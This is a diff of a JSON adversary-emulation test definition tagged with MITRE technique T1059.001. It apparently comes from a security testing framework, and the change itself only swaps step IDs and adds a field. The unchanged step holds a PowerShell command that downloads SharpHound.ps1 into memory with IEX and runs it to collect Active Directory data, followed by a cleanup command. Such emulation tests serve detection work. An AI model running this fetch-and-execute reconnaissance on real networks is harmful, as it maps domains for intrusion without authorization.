@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "0442227b-e9d2-4580-85dc-3ce26dfab343",
+      "id": "6dd74c7d-a60e-4faa-9ec5-4ac6b6a3d0d3",
       "type": "execute-command",
       "data": {
         "command": "write-host \"Remote download of SharpHound.ps1 into memory, followed by execution of the script\" -ForegroundColor Cyan\nIEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');\nInvoke-BloodHound -OutputDirectory $env:Temp\nStart-Sleep 5",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "f0c55f8a-56ce-4bb9-a4a4-79c09a23ac2e",
+      "id": "8f4a4561-9ea3-460a-8ed0-22286778f3a5",
       "type": "execute-command",
       "data": {
         "command": "Remove-Item $env:Temp\\*BloodHound.zip -Force",
@@ -27,18 +27,19 @@
   ],
   "flows": [
     {
-      "s": "0442227b-e9d2-4580-85dc-3ce26dfab343",
+      "s": "6dd74c7d-a60e-4faa-9ec5-4ac6b6a3d0d3",
       "p": "on-success",
-      "o": "f0c55f8a-56ce-4bb9-a4a4-79c09a23ac2e"
+      "o": "8f4a4561-9ea3-460a-8ed0-22286778f3a5"
     },
     {
-      "s": "0442227b-e9d2-4580-85dc-3ce26dfab343",
+      "s": "6dd74c7d-a60e-4faa-9ec5-4ac6b6a3d0d3",
       "p": "on-failure",
-      "o": "f0c55f8a-56ce-4bb9-a4a4-79c09a23ac2e"
+      "o": "8f4a4561-9ea3-460a-8ed0-22286778f3a5"
     }
   ],
   "tags": [
     "T1059",
     "T1059.001"
-  ]
+  ],
+  "input_arguments": null
 }
